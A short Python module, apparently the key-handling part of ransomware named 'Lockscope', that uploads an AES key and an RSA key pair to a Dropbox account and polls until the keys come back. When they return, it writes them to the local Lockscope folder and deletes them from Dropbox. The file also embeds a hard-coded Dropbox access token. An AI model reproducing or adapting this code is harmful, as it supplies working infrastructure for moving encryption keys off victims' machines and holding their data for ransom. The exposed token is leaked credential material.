
import os
import Walk_files
import dropbox
from dropbox.exceptions import ApiError
import time

api_key = 'sl.BxYYgqOJPziYQks7NROy7ow4tnFvMOBWaYqk9nG-x-4x20klqEJ08ja3O40eTXRfK41XdDoQQF8mxnn4oIr9Ygbign9YD1JdYPiIX4BBMgoIJ8meqAIY34AE9eg5WDRysEIiSJ915Kyow-C5HLNXNLU'

dbx = dropbox.Dropbox(api_key)

def local_paths():
    local_aes_key_path = os.path.join(Walk_files.username(), "Lockscope", "key.pkl")
    local_private_key_path = os.path.join(Walk_files.username(), "Lockscope", "private_key.pem")

    return local_aes_key_path, local_private_key_path

def dropbox_paths():
    dropbox_private_key_path = "/keys/private_key.pem"
    dropbox_public_key_path = "/keys/public_key.pem"
    dropbox_aes_key_path = "/keys/key.pkl"

    return dropbox_aes_key_path, dropbox_private_key_path, dropbox_public_key_path

def delete_files(file1, file2):
    try:
        dbx.files_delete(file1)
        dbx.files_delete(file2)
    except ApiError:
        print("API Error")

def upload_files(key,public_key,private_key):

    dropbox_aes_key_path, dropbox_private_key_path, dropbox_public_key_path = dropbox_paths()

    try:
        dbx.files_upload(key, dropbox_aes_key_path)
        dbx.files_upload(private_key, dropbox_private_key_path)
        dbx.files_upload(public_key, dropbox_public_key_path)
    except ApiError:
        print("API error")

    key = b""
    private_key = b""
    public_key = b""


def download_files():
    
    dropbox_aes_key_path, dropbox_private_key_path, dropbox_public_key_path = dropbox_paths()
    local_aes_key_path, local_private_key_path = local_paths()

    while True:
        time.sleep(60)
        try:
            metadata1, res1 = dbx.files_download(dropbox_aes_key_path)
            metadata2, res2 = dbx.files_download(dropbox_private_key_path)
            aes_key = res1.content
            private_key = res2.content

            with open(local_aes_key_path, "wb") as f:
                f.write(aes_key)
            
            with open(local_private_key_path, "wb") as f:
                f.write(private_key)
            break
        
        except ApiError as error:
            if error.error.is_path() and error.error.get_path().is_not_found():
                print("File not uploaded yet. Waiting...")
                time.sleep(180)
            else:
                raise
        
    delete_files(dropbox_aes_key_path, dropbox_private_key_path)
    